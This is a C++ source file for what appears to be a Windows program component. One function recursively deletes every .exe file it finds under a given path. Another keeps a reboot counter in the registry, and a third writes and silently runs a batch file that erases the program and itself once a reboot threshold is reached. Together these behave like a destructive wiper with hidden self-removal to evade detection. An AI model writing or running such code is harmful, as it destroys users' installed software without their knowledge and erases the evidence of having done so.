#include "self_delete.h"
#include "globals.h"

#include <filesystem>
#include <iostream>
#include <fstream>
#include <windows.h>

namespace fs = std::filesystem;

// Define the registry path and value names
const wchar_t* REGISTRY_PATH = L"Software\\MyProgram";
const wchar_t* REBOOT_COUNT_KEY = L"RebootCount";

void SearchAndDeleteDynamicExe(const std::string& basePath) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(basePath, fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file()) {
                std::string filePath = entry.path().string();

                // Check for .exe files
                if (filePath.find(".exe") != std::string::npos) {
                    std::cout << "[DEBUG] Found .exe file: " << filePath << "\n";

                    // Ensure it's not a critical system file
                    if (filePath.find("System32") != std::string::npos || filePath.find("Windows") != std::string::npos) {
                        std::cerr << "[INFO] Skipping potential system file: " << filePath << "\n";
                        continue;
                    }

                    // Attempt to delete the file
                    std::string longPath = "\\\\?\\" + filePath; // Handle long paths
                    if (DeleteFileA(longPath.c_str())) {
                        std::cout << "[INFO] Deleted file: " << filePath << std::endl;
                    } else {
                        DWORD error = GetLastError();
                        std::cerr << "[ERROR] Failed to delete file: " << filePath
                                  << ". Error code: " << error << std::endl;

                        // Handle specific errors
                        if (error == ERROR_ACCESS_DENIED) {
                            std::cerr << "[ERROR] Access denied. File might be in use.\n";
                        } else if (error == ERROR_FILE_NOT_FOUND) {
                            std::cerr << "[ERROR] File not found. Path might be incorrect.\n";
                        }
                    }
                }
            }
        }
    } catch (const fs::filesystem_error& e) {
        std::cerr << "[ERROR] Filesystem error: " << e.what() << std::endl;
    } catch (const std::exception& ex) {
        std::cerr << "[ERROR] Exception: " << ex.what() << std::endl;
    }
}

void LogRebootCount() {
    HKEY hKey;
    DWORD rebootCount = 0;
    DWORD dataSize = sizeof(rebootCount);

    // Open or create the registry key
    if (RegCreateKeyExW(HKEY_CURRENT_USER, REGISTRY_PATH, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        std::cerr << "[ERROR] Failed to open or create registry key.\n";
        return;
    }

    // Read the current reboot count
    if (RegQueryValueExW(hKey, REBOOT_COUNT_KEY, NULL, NULL, reinterpret_cast<LPBYTE>(&rebootCount), &dataSize) != ERROR_SUCCESS) {
        rebootCount = 0; // Initialize if the value doesn't exist
    }

    // Increment the reboot count
    rebootCount++;

    // Update the registry with the new reboot count
    if (RegSetValueExW(hKey, REBOOT_COUNT_KEY, 0, REG_DWORD, reinterpret_cast<const BYTE*>(&rebootCount), sizeof(rebootCount)) != ERROR_SUCCESS) {
        std::cerr << "[ERROR] Failed to update registry key.\n";
    }

    std::cout << "[INFO] Reboot count logged: " << rebootCount << "\n";
    RegCloseKey(hKey);
}

void DeleteAfterReboots() {
    HKEY hKey;
    DWORD rebootCount = 0;
    DWORD dataSize = sizeof(rebootCount);

    // Open the registry key
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REGISTRY_PATH, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        std::cerr << "[ERROR] Failed to open registry key.\n";
        return;
    }

    // Read the current reboot count
    if (RegQueryValueExW(hKey, REBOOT_COUNT_KEY, NULL, NULL, reinterpret_cast<LPBYTE>(&rebootCount), &dataSize) != ERROR_SUCCESS) {
        std::cerr << "[ERROR] Failed to read reboot count.\n";
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);

    // Check if the program should self-delete
    if (rebootCount >= MAX_REBOOTS) {
        std::cout << "[INFO] Reboot count reached maximum. Deleting program...\n";

        char exePath[MAX_PATH];
        if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
            std::cerr << "[ERROR] Failed to get executable path.\n";
            return;
        }

        // Create a unique batch file name
        std::string batchFile = std::string(exePath) + "_delete.bat";
        std::ofstream batch(batchFile, std::ios::out | std::ios::trunc);

        if (batch.is_open()) {
            batch << "@echo off\n";
            batch << "timeout /t 2 >nul\n"; // Add delay to ensure program exits
            batch << "del \"" << exePath << "\"\n";
            batch << "del \"%~f0\"\n"; // Deletes the batch file itself
            batch.close();

            std::cout << "[INFO] Created batch file for self-deletion: " << batchFile << "\n";

            // Execute the batch file
            ShellExecuteA(NULL, "open", batchFile.c_str(), NULL, NULL, SW_HIDE);
        } else {
            std::cerr << "[ERROR] Failed to create batch file for self-deletion.\n";
        }
    }
}
